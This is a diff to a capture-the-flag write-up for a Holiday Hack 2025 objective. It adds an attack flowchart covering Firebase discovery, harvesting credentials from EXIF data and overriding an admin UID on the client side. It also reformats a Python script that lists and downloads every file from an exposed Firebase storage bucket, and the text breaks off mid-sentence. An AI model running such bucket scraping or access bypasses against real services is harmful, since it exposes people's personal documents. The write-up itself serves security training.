@@ -34,6 +34,48 @@ icon: material/text-box-outline
 
     I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.
 
+## High-Level Steps
+
+1. **Discover** – Identify exposed Firebase configuration and resources.
+2. **Investigate** – Extract metadata and leaked data to recover credentials.
+3. **Bypass** – Override client-side controls to access admin content.
+
+```mermaid
+%%{init: {"themeVariables": {
+  "fontSize": "25px",
+  "nodeTextSize": "18px",
+  "clusterTextSize": "22px"
+}}}%%
+flowchart TD
+
+  subgraph Row1["Discover"]
+    direction LR
+    A[Inspect client-side JavaScript]
+    B[Identify Firebase configuration]
+    A --> B
+  end
+
+  subgraph Row2["Investigate"]
+    direction LR
+    C[Enumerate storage bucket]
+    D[Extract EXIF metadata]
+    E[Identify user credentials]
+    C --> D --> E
+  end
+
+  subgraph Row3["Bypass"]
+    direction LR
+    F[Locate admin UID in JS]
+    G[Set admin UID in browser]
+    H[Access admin page]
+    I[Reveal passphrase]
+    J[Objective completed]
+    F --> G --> H --> I --> J
+  end
+
+  Row1 --> Row2
+  Row2 --> Row3
+```
 ## Solution
 
 The [login page](https://gnometea.web.app/login){:target="_blank" rel="noopener"} of the app references the below [index-BVLyJWJ_.js](https://gnometea.web.app/assets/index-BVLyJWJ_.js){:target="_blank" rel="noopener"} file. <br/>
@@ -48,46 +90,47 @@ This JS file has hard coded values. <br/>
 ```
 ![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_1.png)<br/>
 
-Wrote the download_files.py to download all teh files in teh stogareBucket
+Wrote the below download_files.py to download all the files in the  stogare bucket. <br/>
 Its all jpeg(driver licence) and png files(photos) of the gnomes.
 
-```py title="download_files.py"
-    import requests
-    import os
+??? download_files.py
+    ```py title="download_files.py"
+        import requests
+        import os
 
-    bucket = 'holidayhack2025.firebasestorage.app'
-    file_path = 'tea'  # Firebase path to file
-    file_path_encoded = file_path.replace('/', '%2F')
+        bucket = 'holidayhack2025.firebasestorage.app'
+        file_path = 'tea'  # Firebase path to file
+        file_path_encoded = file_path.replace('/', '%2F')
 
-    url = f'https://firebasestorage.googleapis.com/v0/b/{bucket}/o'
+        url = f'https://firebasestorage.googleapis.com/v0/b/{bucket}/o'
 
-    # Create folder to save downloads
-    os.makedirs('downloads', exist_ok=True)
+        # Create folder to save downloads
+        os.makedirs('downloads', exist_ok=True)
 
-    # List all files
-    response = requests.get(url)
+        # List all files
+        response = requests.get(url)
 
-    if response.status_code == 200:
-        data = response.json()
-        items = data.get('items', [])
+        if response.status_code == 200:
+            data = response.json()
+            items = data.get('items', [])
 
-        for item in items:
-            name = item['name']
-            name_encoded = name.replace('/', '%2F')  # URL encode
-            download_url = f'https://firebasestorage.googleapis.com/v0/b/{bucket}/o/{name_encoded}?alt=media'
+            for item in items:
+                name = item['name']
+                name_encoded = name.replace('/', '%2F')  # URL encode
+                download_url = f'https://firebasestorage.googleapis.com/v0/b/{bucket}/o/{name_encoded}?alt=media'
 
-            print(f'Downloading: {name}')
-            file_response = requests.get(download_url)
+                print(f'Downloading: {name}')
+                file_response = requests.get(download_url)
 
-            if file_response.status_code == 200:
-                with open(os.path.join('downloads', os.path.basename(name)), 'wb') as f:
-                    f.write(file_response.content)
-            else:
-                print(f"Failed to download {name}: {file_response.status_code}")
-    else:
-        print("Bucket is not public or listing not allowed:", response.status_code)
+                if file_response.status_code == 200:
+                    with open(os.path.join('downloads', os.path.basename(name)), 'wb') as f:
+                        f.write(file_response.content)
+                else:
+                    print(f"Failed to download {name}: {file_response.status_code}")
+        else:
+            print("Bucket is not public or listing not allowed:", response.status_code)
 
-```
+    ```
 
 ![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_2.png)<br/>
 from the hint 
